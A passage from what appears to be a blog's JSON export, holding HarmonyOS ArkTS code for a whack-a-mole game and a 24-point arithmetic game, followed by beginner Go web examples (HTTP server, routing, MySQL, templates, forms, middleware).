&#125; // 地鼠每隔多长时间显示 Column(&#123; space: 5 &#125;) &#123; // 创建一个垂直布局，设置间距 Text(`出现间隔(毫秒)`).fontColor(Color.Black) // 显示地鼠出现间隔的文本 Counter() &#123; // 创建一个计数器组件 Text(`$&#123;this.animationInterval&#125;`) // 显示地鼠出现的间隔时间 .fontColor(Color.Black) // 设置字体颜色 &#125; .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加按钮的点击事件 this.animationInterval += 100; // 每次增加100毫秒 &#125;).onDec(() =&gt; &#123; // 减少按钮的点击事件 this.animationInterval -= 100; // 每次减少100毫秒 this.animationInterval = this.animationInterval &lt; 100 ? 100 : this.animationInterval; // 确保最小值为100毫秒 &#125;); &#125; // 地鼠停留时间 Column(&#123; space: 5 &#125;) &#123; // 创建一个垂直布局，设置间距 Text(`停留间隔(毫秒)`).fontColor(Color.Black) // 显示地鼠停留时间的文本 Counter() &#123; // 创建一个计数器组件 Text(`$&#123;this.hamsterStayDuration&#125;`) // 显示地鼠的停留时间 .fontColor(Color.Black) // 设置字体颜色 &#125; .width(300) // 设置计数器宽度 .onInc(() =&gt; &#123; // 增加按钮的点击事件 this.hamsterStayDuration += 100; // 每次增加100毫秒 &#125;).onDec(() =&gt; &#123; // 减少按钮的点击事件 this.hamsterStayDuration -= 100; // 每次减少100毫秒 this.hamsterStayDuration = this.hamsterStayDuration &lt; 100 ? 100 : this.hamsterStayDuration; // 确保最小值为100毫秒 &#125;); &#125; &#125;.layoutWeight(1).padding(&#123; left: 50 &#125;) // 设置布局权重和左边距 // 游戏区 Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; // 创建一个可换行的弹性布局 ForEach(this.cells, (cell: Cell, index: number) =&gt; &#123; // 遍历所有单元格 Stack() &#123; // 创建一个堆叠布局 // 洞 Ellipse() .width(`$&#123;this.cellWidth / 1.2&#125;lpx`) // 设置洞的宽度 .height(`$&#123;this.cellWidth / 2.2&#125;lpx`) // 设置洞的高度 .fillOpacity(1) // 设置填充不透明度 .fill(&quot;#020101&quot;) // 设置填充颜色 .stroke(&quot;#020101&quot;) // 设置边框颜色 .strokeWidth(1) // 设置边框宽度 .margin(&#123; top: `$&#123;this.cellWidth / 2&#125;lpx` &#125;) // 设置上边距 // 地鼠 Hamster(&#123; cellWidth: this.cellWidth &#125;) // 创建地鼠组件 .visibility(cell.isSelected ? Visibility.Visible : Visibility.None) // 根据状态设置可见性 .scale(cell.scaleOptions) // 设置缩放选项 &#125;.width(`$&#123;this.cellWidth&#125;lpx`).height(`$&#123;this.cellWidth&#125;lpx`) // 设置堆叠布局的宽度和高度 .margin(&#123; left: `$&#123;index == 0 || index == 7 ? this.cellWidth / 2 : 0&#125;lpx` &#125;) // 设置左边距 .onClick(() =&gt; &#123; // 点击事件 if (cell.isSelected) &#123; // 如果当前单元格是选中状态 animateToImmediately(&#123; // 执行动画 duration: 200, // 动画持续时间 curve: curves.springCurve(10, 1, 228, 30), // 动画曲线 onFinish: () =&gt; &#123; // 动画结束后的回调 cell.isSelected = false // 隐藏地鼠 cell.scaleOptions = &#123; x: 1.0, y: 1.0 &#125;; // 重置缩放 this.currentScore += 1 // 增加得分 &#125; &#125;, () =&gt; &#123; cell.scaleOptions = &#123; x: 0, y: 0 &#125;; // 动画开始时缩放到0 &#125;) &#125; &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 4&#125;lpx`) // 设置游戏区的宽度 // 操作按钮 Column(&#123; space: 20 &#125;) &#123; // 创建一个垂直布局，设置间距 // 倒计时 TextTimer(&#123; isCountDown: true, count: this.gameDuration, controller: this.countdownTimerController &#125;) // 创建倒计时组件 .contentModifier(this.timerModifier) // 应用计时器修饰符 .onTimer((utc: number, elapsedTime: number) =&gt; &#123; // 定义计时器的回调 // 每隔指定时间随机显示地鼠 if (elapsedTime * 10 &gt;= this.animationInterval * this.animationIntervalCount) &#123; // 判断是否达到显示地鼠的时间 this.animationIntervalCount++ // 增加动画间隔计数 // 获取可以出现的位置集合 let availableIndexList: number[] = [] // 存储可用的索引 for (let i = 0; i &lt; this.cells.length; i++) &#123; // 遍历所有单元格 if (!this.cells[i].isSelected) &#123; // 如果当前单元格未被选中 availableIndexList.push(i) // 添加到可用索引列表 &#125; &#125; // 根据每次出现次数 appearanceCount 利用洗牌算法随机抽取 for (let i = 0; i &lt; availableIndexList.length; i++) &#123; // 遍历可用索引列表 let index = Math.floor(Math.random() * (availableIndexList.length - i)) // 随机选择一个索引 let temp = availableIndexList[availableIndexList.length - i - 1] // 交换位置 availableIndexList[availableIndexList.length - i - 1] = availableIndexList[index] availableIndexList[index] = temp &#125; // 随机抽取 appearanceCount，取前几个已经打乱好的顺序 for (let i = 0; i &lt; availableIndexList.length; i++) &#123; // 遍历可用索引列表 if (i &lt; this.appearanceCount) &#123; // 如果索引小于每次出现的数量 this.cells[availableIndexList[i]].setSelectedTrueTime() // 设置选中的单元格为显示状态 &#125; &#125; &#125; if (elapsedTime % 10 == 0) &#123; // 每隔100毫秒检查一次 console.info(&#x27;检查停留时间是否已过，如果过了就隐藏地鼠&#x27;) // 输出调试信息 for (let i = 0; i &lt; this.cells.length; i++) &#123; // 遍历所有单元格 this.cells[i].checkTime(this.hamsterStayDuration) // 检查每个单元格的停留时间 &#125; &#125; if (elapsedTime * 10 &gt;= this.gameDuration) &#123; // 如果计时结束 let currentScore = this.currentScore // 获取当前得分 this.getUIContext().showAlertDialog(&#123; // 显示结果对话框 // 显示结果页 title: &#x27;游戏结束&#x27;, // 对话框标题 message: `得分：$&#123;currentScore&#125;`, // 显示得分信息 confirm: &#123; // 确认按钮配置 defaultFocus: true, // 默认焦点 value: &#x27;我知道了&#x27;, // 按钮文本 action: () =&gt; &#123; // 点击后的动作 // 这里可以添加点击确认后的逻辑 &#125; &#125;, onWillDismiss: () =&gt; &#123; // 关闭前的动作 // 这里可以添加关闭前的逻辑 &#125;, alignment: DialogAlignment.Center, // 对齐方式为中心 &#125;); this.endGame() // 结束游戏 &#125; &#125;) Text(`当前得分：$&#123;this.currentScore&#125;`) // 显示当前得分 Button(&#x27;开始游戏&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;).onClick(() =&gt; &#123; // 创建开始游戏按钮 this.startGame() // 点击后开始游戏 &#125;) Button(&#x27;结束游戏&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT &#125;).onClick(() =&gt; &#123; // 创建结束游戏按钮 this.endGame() // 点击后结束游戏 &#125;) &#125;.layoutWeight(1) // 设置布局权重 &#125; .height(&#x27;100%&#x27;) // 设置整体高度为100% .width(&#x27;100%&#x27;) // 设置整体宽度为100% .backgroundColor(&quot;#61ac57&quot;) // 设置背景颜色 .justifyContent(FlexAlign.SpaceBetween) // 设置内容对齐方式 &#125;&#125; 24巧算24点是一个经典的数学游戏，其规则简单而富有挑战性：玩家需利用给定的四个数字，通过加、减、乘、除运算，使得计算结果等于24。## 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27; // 导入用于提示用户的工具包@ObservedV2 // 装饰器，使类成为可观察对象class Cell &#123; // 定义一个Cell类，代表游戏中的一个单元格 @Trace value: number // 使用装饰器标记value属性，使其成为追踪属性 @Trace displayValue: string // 同上，用于显示的值 @Trace isVisible: boolean // 同上，判断是否可见 @Trace xPosition: number // 同上，x坐标位置 @Trace yPosition: number // 同上，y坐标位置 columnIndex: number // 列索引 rowIndex: number // 行索引 constructor(rowIndex: number, columnIndex: number) &#123; // 构造函数 this.rowIndex = rowIndex // 设置行索引 this.columnIndex = columnIndex // 设置列索引 this.xPosition = 0 // 初始化x坐标位置 this.yPosition = 0 // 初始化y坐标位置 this.value = 0 // 初始化数值 this.displayValue = &#x27;&#x27; // 初始化显示值 this.isVisible = true // 初始化可见性 &#125; setDefaultValue(value: number) &#123; // 设置单元格的默认值 this.value = value // 设置数值 this.displayValue = `$&#123;value&#125;` // 设置显示值 this.isVisible = true // 设置为可见 &#125; performOperation(otherCell: Cell, operationName: string) &#123; // 执行与其他单元格的操作 switch (operationName) &#123; // 根据操作名称进行不同的运算 case &quot;加&quot;: // 如果是加法 this.value = otherCell.value + this.value // 计算新值 break // 结束case块 case &quot;减&quot;: // 如果是减法 this.value = otherCell.value - this.value // 计算新值 break // 结束case块 case &quot;乘&quot;: // 如果是乘法 this.value = otherCell.value * this.value // 计算新值 break // 结束case块 case &quot;除&quot;: // 如果是除法 if (this.value === 0) &#123; // 检查除数是否为0 promptAction.showToast(&#123; message: &#x27;除数不能为0&#x27;, bottom: 400 &#125;) // 提示错误信息 return false // 返回false，表示操作无效 &#125; this.value = otherCell.value / this.value // 计算新值 break // 结束case块 &#125; otherCell.isVisible = false // 隐藏参与运算的另一个单元格 this.displayValue = `$&#123;this.value &gt;= 0 ? &#x27;&#x27; : &#x27;-&#x27;&#125;$&#123;this.convertToFraction(Math.abs(this.value))&#125;` // 更新显示值 return true // 返回true，表示操作成功 &#125; findGreatestCommonDivisor(a: number, b: number): number &#123; // 计算两个数的最大公约数 return b === 0 ? a : this.findGreatestCommonDivisor(b, a % b) // 使用递归算法求最大公约数 &#125; convertToFraction(decimal: number): string &#123; // 将小数转换为分数形式 let tolerance = 1.0E-6 // 设置容差值 let maxIterations = 1000 // 设置最大迭代次数 let pNumerator = 1 // 分子初始化 let pDenominator = 0 // 分母初始化 let qNumerator = 0 // 辅助变量 let qDenominator = 1 // 辅助变量 let currentDecimal = decimal // 当前处理的小数 let iterationCount = 0 // 迭代计数 do &#123; // 执行直到满足条件 let integerPart = Math.floor(currentDecimal) // 取整部分 let temp = pNumerator // 临时保存分子 pNumerator = integerPart * pNumerator + pDenominator // 更新分子 pDenominator = temp // 更新分母 temp = qNumerator // 临时保存辅助变量 qNumerator = integerPart * qNumerator + qDenominator // 更新辅助变量 qDenominator = temp // 更新辅助变量 currentDecimal = 1 / (currentDecimal - integerPart) // 更新小数部分 iterationCount++ // 增加迭代计数 &#125; while (Math.abs(decimal - pNumerator / qNumerator) &gt; decimal * tolerance &amp;&amp; iterationCount &lt; maxIterations) // 继续迭代直到达到容差或最大迭代次数 if (iterationCount &gt;= maxIterations) &#123; // 如果达到最大迭代次数 return `$&#123;decimal&#125;` // 返回原小数 &#125; let gcdValue = this.calculateIterativeGcd(pNumerator, qNumerator) // 计算分子和分母的最大公约数 let reducedNumerator = pNumerator / gcdValue // 化简后的分子 let reducedDenominator = qNumerator / gcdValue // 化简后的分母 return `$&#123;reducedNumerator&#125;$&#123;reducedDenominator !== 1 ? &#x27;/&#x27; + reducedDenominator : &#x27;&#x27;&#125;` // 返回化简后的分数形式 &#125; calculateIterativeGcd(a: number, b: number): number &#123; // 使用迭代方式计算两个数的最大公约数 while (b !== 0) &#123; // 当b不为0时继续 let temp = b // 临时保存b b = a % b // 更新b a = temp // 更新a &#125; return a // 返回最大公约数 &#125;&#125;class JudgePointSolution &#123; // 定义JudgePointSolution类，用于寻找24点游戏的解 solutions: string[] = [] // 存储找到的解 accuracyThreshold = Math.pow(10, -6) // 设置精度阈值 operations = [// 定义四种基本运算 (a: number, b: number) =&gt; a + b, // 加法 (a: number, b: number) =&gt; a * b, // 乘法 (a: number, b: number) =&gt; a - b, // 减法 (a: number, b: number) =&gt; a / b,// 除法 ] searchSolutions(currentNumbers: number[], pathExpression: string) &#123; // 查找解的递归方法 if (this.solutions.length &gt; 0) &#123; // 如果已经找到解，则返回 return &#125; if (currentNumbers.length === 1) &#123; // 如果只剩下一个数 if (Math.abs(currentNumbers[0] - 24) &lt; this.accuracyThreshold) &#123; // 如果该数等于24（在阈值范围内） this.solutions.push(pathExpression) // 将路径表达式作为解加入数组 &#125; return // 结束递归 &#125; for (let i = 0; i &lt; currentNumbers.length - 1; i++) &#123; // 对所有数进行两两组合 for (let j = i + 1; j &lt; currentNumbers.length; j++) &#123; // 对所有数进行两两组合 const tempNumbers = this.removeNumberFromArray(currentNumbers, i, j) // 创建新的数组，移除当前两个数 for (let k = 0; k &lt; 4; k++) &#123; // 对四种运算分别尝试 let tempPath = pathExpression.length &gt; 0 ? `$&#123;pathExpression&#125;, ` : &#x27;&#x27; // 格式化路径表达式 tempPath += `($&#123;currentNumbers[i]&#125; $&#123;this.getOperationSymbol(k)&#125; $&#123;currentNumbers[j]&#125;)` // 添加当前运算表达式到路径 tempNumbers.push(this.operations[k](currentNumbers[i], currentNumbers[j])) // 计算结果并加入临时数组 this.searchSolutions(tempNumbers, tempPath) // 递归查找解 tempNumbers.pop() // 移除最后一个加入的结果 if (k === 2 || k === 3) &#123; // 如果是减法或除法 let tempPathSwapped = pathExpression.length &gt; 0 ? `$&#123;pathExpression&#125;, ` : &#x27;&#x27; // 格式化路径表达式 tempPathSwapped += `($&#123;currentNumbers[j]&#125; $&#123;this.getOperationSymbol(k)&#125; $&#123;currentNumbers[i]&#125;)` // 添加当前运算表达式到路径 tempNumbers.push(this.operations[k](currentNumbers[j], currentNumbers[i])) // 计算结果并加入临时数组 this.searchSolutions(tempNumbers, tempPathSwapped) // 递归查找解 tempNumbers.pop() // 移除最后一个加入的结果 &#125; &#125; &#125; &#125; &#125; find24Solutions(numbers: number[]): string[] &#123; // 查找所有可能的解 this.solutions = [] // 清空解数组 this.searchSolutions(numbers, &#x27;&#x27;) // 开始查找 return this.solutions // 返回解数组 &#125; getOperationSymbol(index: number): string &#123; // 获取运算符号 const symbols = [&#x27;+&#x27;, &#x27;*&#x27;, &#x27;-&#x27;, &#x27;/&#x27;] // 定义符号数组 return symbols[index] // 返回对应的符号 &#125; removeNumberFromArray(array: number[], index1: number, index2: number): number[] &#123; // 从数组中移除指定位置的元素 const newArray: number[] = [] // 新数组 for (let k = 0; k &lt; array.length; k++) &#123; // 遍历原始数组 if (k !== index1 &amp;&amp; k !== index2) &#123; // 如果不是需要移除的位置 newArray.push(array[k]) // 将元素加入新数组 &#125; &#125; return newArray // 返回新数组 &#125;&#125;@Entry@Componentstruct GameIndex &#123; @State randomNumbers: number[] = [] // 用于存储随机生成的游戏数字 @State symbols: string[] = [&quot;加&quot;, &quot;减&quot;, &quot;乘&quot;, &quot;除&quot;] // 存储游戏中可用的运算符号字符串数组 @State cells: Cell[] = [// 存储游戏中的单元格实例数组 new Cell(0, 0), // 创建位于第0行第0列的单元格 new Cell(0, 1), // 创建位于第0行第1列的单元格 new Cell(1, 0), // 创建位于第1行第0列的单元格 new Cell(1, 1)// 创建位于第1行第1列的单元格 ] @State selectedNumberIndex: number = -1 // 存储选中的数字单元格的索引，默认为-1表示未选择 @State selectedSymbolIndex: number = -1 // 存储选中的运算符号的索引，默认为-1表示未选择 @State showSolution: boolean = false // 控制是否显示游戏的解决方案，默认为不显示 cellWidth: number = 250 // 单个单元格的宽度 cellMargin: number = 15 // 单元格之间的间距 judgePoint24Util: JudgePointSolution = new JudgePointSolution() // 创建一个JudgePointSolution类的实例，用于寻找游戏的解 isShowAnim: boolean = false //单元格是否正在移动，若移动中禁止操作以防闪退 aboutToAppear(): void &#123; this.resetGame() &#125; resetGame() &#123; this.randomNumbers = [] for (let i = 0; i &lt; this.cells.length; i++) &#123; let randomValue = Math.floor(Math.random() * 13) + 1 this.cells[i].setDefaultValue(randomValue) this.randomNumbers.push(randomValue) &#125; this.selectedNumberIndex = -1 this.selectedSymbolIndex = -1 this.showSolution = false let solutions = this.judgePoint24Util.find24Solutions(this.randomNumbers) console.info(`【$&#123;solutions&#125;】`) if (solutions.length === 0) &#123; console.info(`无解，重新循环`) this.resetGame() &#125; &#125; build() &#123; Column(&#123; space: 20 &#125;) &#123; // 显示/隐藏 解决方案 Text(`$&#123;this.judgePoint24Util.find24Solutions(this.randomNumbers)&#125;`) .fontSize(20) .fontColor(Color.White) .backgroundColor(&quot;#ffa101&quot;) .visibility(this.showSolution ? Visibility.Visible : Visibility.Hidden) .padding(10) .borderRadius(10) // 数字 Row() &#123; Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.cells, (cell: Cell, index: number) =&gt; &#123; Text(`$&#123;cell.displayValue&#125;`) .fontSize(`$&#123;this.cellWidth / 3&#125;lpx`) .width(`$&#123;this.cellWidth&#125;lpx`) .height(`$&#123;this.cellWidth&#125;lpx`) .fontColor(cell !== this.cells[this.selectedNumberIndex] ? &quot;#ffffff&quot; : &quot;#fe4b00&quot;) .backgroundColor(cell !== this.cells[this.selectedNumberIndex] ? &quot;#ffa101&quot; : &quot;#fddf4b&quot;) .borderRadius(`$&#123;this.cellMargin&#125;lpx`) .margin(`$&#123;this.cellMargin&#125;lpx`) .textAlign(TextAlign.Center) .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) .visibility(cell.isVisible ? Visibility.Visible : Visibility.Hidden) .translate(&#123; x: `$&#123;cell.xPosition&#125;lpx`, y: `$&#123;cell.yPosition&#125;lpx` &#125;) .onClick(() =&gt; &#123; if (this.selectedNumberIndex === -1) &#123; this.selectedNumberIndex = index &#125; else if (this.selectedNumberIndex === index) &#123; this.selectedNumberIndex = -1 &#125; else if (this.selectedSymbolIndex === -1) &#123; console.info(`未选择操作符，仅改变选中位置`) this.selectedNumberIndex = index &#125; else &#123; if (this.isShowAnim) &#123; return &#125; this.isShowAnim = true animateToImmediately(&#123; duration: 300, onFinish: () =&gt; &#123; this.cells[this.selectedNumberIndex].xPosition = 0 // 动画结束后位置归0 this.cells[this.selectedNumberIndex].yPosition = 0 // 动画结束后位置归0 this.cells[index].performOperation( this.cells[this.selectedNumberIndex], this.symbols[this.selectedSymbolIndex] ) this.selectedNumberIndex = -1 this.selectedSymbolIndex = -1 // 统计结果 let countVisibleCells: number = 0 for (let i = 0; i &lt; this.cells.length; i++) &#123; if (this.cells[i].isVisible) &#123; countVisibleCells++ &#125; &#125; if (countVisibleCells === 1) &#123; // 当前是最后一个 promptAction.showDialog(&#123; title: &#x27;游戏结束&#x27;, message: `$&#123;this.cells[index].value === 24 ? &#x27;【胜利】&#x27; : &#x27;【失败】&#x27;&#125;`, buttons: [&#123; text: &#x27;重新开始&#x27;, color: &#x27;#ffa500&#x27; &#125;] &#125;).then(() =&gt; &#123; this.resetGame() &#125;) &#125; this.isShowAnim = false &#125;, &#125;, () =&gt; &#123; let temp = this.cellWidth + this.cellMargin // 要移动的单元格距离 let movingCell: Cell = this.cells[this.selectedNumberIndex] movingCell.xPosition = (cell.columnIndex - movingCell.columnIndex) * temp movingCell.yPosition = (cell.rowIndex - movingCell.rowIndex) * temp &#125;) &#125; &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 2 + this.cellMargin * 4&#125;lpx`) &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.Center) // 操作符 Row() &#123; Flex(&#123; wrap: FlexWrap.Wrap &#125;) &#123; ForEach(this.symbols, (symbol: string, index: number) =&gt; &#123; Text(`$&#123;symbol&#125;`) .fontSize(`$&#123;this.cellWidth / 4&#125;lpx`) .width(`$&#123;this.cellWidth / 2&#125;lpx`) .height(`$&#123;this.cellWidth / 2&#125;lpx`) .fontColor(this.selectedSymbolIndex !== index ? &quot;#c16cf9&quot; : &quot;#fcfeff&quot;) .backgroundColor(this.selectedSymbolIndex !== index ? Color.Transparent : &quot;#c16cf9&quot;) .borderRadius(`$&#123;this.cellMargin&#125;lpx`) .margin(`$&#123;this.cellMargin / 2&#125;lpx`) .textAlign(TextAlign.Center) .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) .onClick(() =&gt; &#123; if (this.selectedSymbolIndex === index) &#123; this.selectedSymbolIndex = -1 &#125; else &#123; this.selectedSymbolIndex = index &#125; &#125;) &#125;) &#125;.width(`$&#123;this.cellWidth * 2 + this.cellMargin * 4&#125;lpx`) &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.Center) // 重新开始 / 解决方案 Row() &#123; Button(&#x27;重新开始&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;).onClick(() =&gt; &#123; this.resetGame() &#125;) Button(&#x27;解决方案&#x27;).clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;).onClick(() =&gt; &#123; this.showSolution = !this.showSolution &#125;) &#125;.width(&#x27;100%&#x27;).justifyContent(FlexAlign.SpaceEvenly) &#125; .width(&#x27;100%&#x27;).height(&#x27;100%&#x27;) .backgroundColor(&quot;#0d1015&quot;) .padding(20) &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"},{"name":"WorldTime","slug":"WorldTime","permalink":"https://banjinmei.github.io/tags/WorldTime/"}],"author":"mu"},{"title":"Golang Web Base","slug":"Golang-Base","date":"2024-06-13T21:53:14.000Z","updated":"2024-06-18T15:13:26.000Z","comments":true,"path":"2024/06/14/Golang-Base/","permalink":"https://banjinmei.github.io/2024/06/14/Golang-Base/","excerpt":"","text":"setupwindows环境安装windows环境下，go安装包安装成功后，会自动将go添加到path目录下，所以不需要再向Path环境变量中添加go GOROOT设置：Go安装路径 “我的电脑”&#x3D;》“属性”&#x3D;》“高级系统设置”&#x3D;》“环境变量”&#x3D;》“系统环境变量”，新增GOROOT环境变量 web123456789101112131415package mainimport ( &quot;fmt&quot; &quot;net/http&quot;)func main() &#123; http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, &quot;Hello, m requested: %s\\n&quot;, r.URL.Path) &#125;) http.ListenAndServe(&quot;:24612&quot;, nil)&#125; Http Serverstatic 1234567891011121314 http.HandleFunc(&quot;/&quot;, func (w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, &quot;Welcome !&quot;) &#125;) fs := http.FileServer(http.Dir(&quot;static/&quot;)) http.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, fs)) http.ListenAndServe(&quot;:24612&quot;, nil)````## gorilla/muxrouter```bashgo get github.com/gorilla/mux 1234567891011121314151617181920212223package mainimport ( &quot;fmt&quot; &quot;net/http&quot; &quot;github.com/gorilla/mux&quot;)func main() &#123; r := mux.NewRouter() r.HandleFunc(&quot;/books/&#123;title&#125;/page/&#123;page&#125;&quot;, func(w http.ResponseWriter, r *http.Request) &#123; vars := mux.Vars(r) title := vars[&quot;title&quot;] page := vars[&quot;page&quot;] fmt.Fprintf(w, &quot; book: %s on page %s\\n&quot;, title, page) &#125;) http.ListenAndServe(&quot;:24612&quot;, r)&#125;//http://localhost:24612/books/mybook/page/1 sql123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package mainimport ( &quot;database/sql&quot; &quot;fmt&quot; &quot;log&quot; &quot;time&quot; _ &quot;github.com/go-sql-driver/mysql&quot;)func main() &#123; db, err := sql.Open(&quot;mysql&quot;, &quot;root:xxx@(119.23.xxx.xxx:123)/TestDB?parseTime=true&quot;) if err != nil &#123; log.Fatal(err) &#125; if err := db.Ping(); err != nil &#123; log.Fatal(err) &#125; // &#123; // Create a new table // query := ` // CREATE TABLE users ( // id INT AUTO_INCREMENT, // username TEXT NOT NULL, // password TEXT NOT NULL, // created_at DATETIME, // PRIMARY KEY (id) // );` // if _, err := db.Exec(query); err != nil &#123; // log.Fatal(err) // &#125; // &#125; &#123; // Insert a new user username := &quot;m24612&quot; password := &quot;secret&quot; createdAt := time.Now() result, err := db.Exec(`INSERT INTO users (username, password, created_at) VALUES (?, ?, ?)`, username, password, createdAt) if err != nil &#123; log.Fatal(err) &#125; id, err := result.LastInsertId() fmt.Println(id) &#125; &#123; // Query a single user var ( id int username string password string createdAt time.Time ) query := &quot;SELECT id, username, password, created_at FROM users WHERE id = ?&quot; if err := db.QueryRow(query, 1).Scan(&amp;id, &amp;username, &amp;password, &amp;createdAt); err != nil &#123; log.Fatal(err) &#125; fmt.Println(id, username, password, createdAt) &#125; &#123; // Query all users type user struct &#123; id int username string password string createdAt time.Time &#125; rows, err := db.Query(`SELECT id, username, password, created_at FROM users`) if err != nil &#123; log.Fatal(err) &#125; defer rows.Close() var users []user for rows.Next() &#123; var u user err := rows.Scan(&amp;u.id, &amp;u.username, &amp;u.password, &amp;u.createdAt) if err != nil &#123; log.Fatal(err) &#125; users = append(users, u) &#125; if err := rows.Err(); err != nil &#123; log.Fatal(err) &#125; fmt.Printf(&quot;%#v&quot;, users) &#125; // &#123; // _, err := db.Exec(`DELETE FROM users WHERE id = ?`, 1) // if err != nil &#123; // log.Fatal(err) // &#125; // &#125;&#125; Template123456789101112131415161718192021222324252627282930313233343536373839package mainimport ( &quot;html/template&quot; &quot;net/http&quot;)type Todo struct &#123; Title string Done bool&#125;type TodoPageData struct &#123; PageTitle string Todos []Todo&#125;func main() &#123; tmpl := template.Must(template.ParseFiles(&quot;layout.html&quot;)) http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; data := TodoPageData&#123; PageTitle: &quot;My TODO list&quot;, Todos: []Todo&#123; &#123;Title: &quot;Task 1&quot;, Done: false&#125;, &#123;Title: &quot;Task 2&quot;, Done: true&#125;, &#123;Title: &quot;Task 3&quot;, Done: true&#125;, &#125;, &#125; tmpl.Execute(w, data) &#125;) http.ListenAndServe(&quot;:80&quot;, nil)&#125; html 12345678910&lt;h1&gt;&#123;&#123;.PageTitle&#125;&#125;&lt;/h1&gt;&lt;ul&gt; &#123;&#123;range .Todos&#125;&#125; &#123;&#123;if .Done&#125;&#125; &lt;li class=&quot;done&quot;&gt;&#123;&#123;.Title&#125;&#125;&lt;/li&gt; &#123;&#123;else&#125;&#125; &lt;li&gt;&#123;&#123;.Title&#125;&#125;&lt;/li&gt; &#123;&#123;end&#125;&#125; &#123;&#123;end&#125;&#125;&lt;/ul&gt; static123456789101112131415161718192021222324252627282930313233package main import ( &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; ) func main() &#123; // 设置 HTML 文件的路径 htmlFilePath := &quot;static/test.html&quot; // 创建一个 HTTP 处理程序来服务 HTML 文件 http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; // 读取 HTML 文件 data, err := ioutil.ReadFile(htmlFilePath) if err != nil &#123; http.Error(w, &quot;Error reading HTML file&quot;, http.StatusInternalServerError) return &#125; // 将文件内容写入 HTTP 响应 w.Header().Set(&quot;Content-Type&quot;, &quot;text/html; charset=utf-8&quot;) w.Write(data) &#125;) // 启动 HTTP 服务器并监听端口 8080 log.Println(&quot;Listening on :8080...&quot;) if err := http.ListenAndServe(&quot;:8080&quot;, nil); err != nil &#123; log.Fatal(&quot;ListenAndServe: &quot;, err) &#125; &#125; from12345678910111213141516171819202122232425262728293031323334353637383940package mainimport ( &quot;html/template&quot; &quot;net/http&quot; &quot;fmt&quot;)type ContactDetails struct &#123; Email string Subject string Message string&#125;func main() &#123; tmpl := template.Must(template.ParseFiles(&quot;temp.html&quot;)) http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) &#123; if r.Method != http.MethodPost &#123; tmpl.Execute(w, nil) return &#125; details := ContactDetails&#123; Email: r.FormValue(&quot;email&quot;), Subject: r.FormValue(&quot;sub&quot;), Message: r.FormValue(&quot;msg&quot;), &#125; fmt.Println(details) fmt.Println(details.Email) // do something with details _ = details tmpl.Execute(w, struct&#123; Success bool &#125;&#123;true&#125;) &#125;) http.ListenAndServe(&quot;:8080&quot;, nil)&#125; 1234567891011121314&#123;&#123;if .Success&#125;&#125; &lt;h1&gt; message!&lt;/h1&gt;&#123;&#123;else&#125;&#125; &lt;h1&gt;Contact&lt;/h1&gt; &lt;form method=&quot;POST&quot;&gt; &lt;label&gt;Email:&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot;&gt;&lt;br /&gt; &lt;label&gt;Subject:&lt;/label&gt;&lt;br /&gt; &lt;input type=&quot;text&quot; name=&quot;sub&quot;&gt;&lt;br /&gt; &lt;label&gt;Message:&lt;/label&gt;&lt;br /&gt; &lt;textarea name=&quot;msg&quot;&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt;&#123;&#123;end&#125;&#125; HandleFunc123456789101112131415161718192021222324252627282930// basic-middleware.gopackage mainimport ( &quot;fmt&quot; &quot;log&quot; &quot;net/http&quot;)func logging(f http.HandlerFunc) http.HandlerFunc &#123; return func(w http.ResponseWriter, r *http.Request) &#123; log.Println(r.URL.Path) f(w, r) &#125;&#125;func foo(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, &quot;www&quot;)&#125;func bar(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, &quot;bbb&quot;)&#125;func main() &#123; http.HandleFunc(&quot;/www&quot;, logging(foo)) http.HandleFunc(&quot;/bbb&quot;, logging(bar)) http.ListenAndServe(&quot;:24614&quot;, nil)&#125; json123456789101112131415161718192021222324252627282930313233343536373839package mainimport ( &quot;encoding/json&quot; &quot;fmt&quot; &quot;net/http&quot;)type User struct &#123; Firstname string `json:&quot;firstname&quot;` 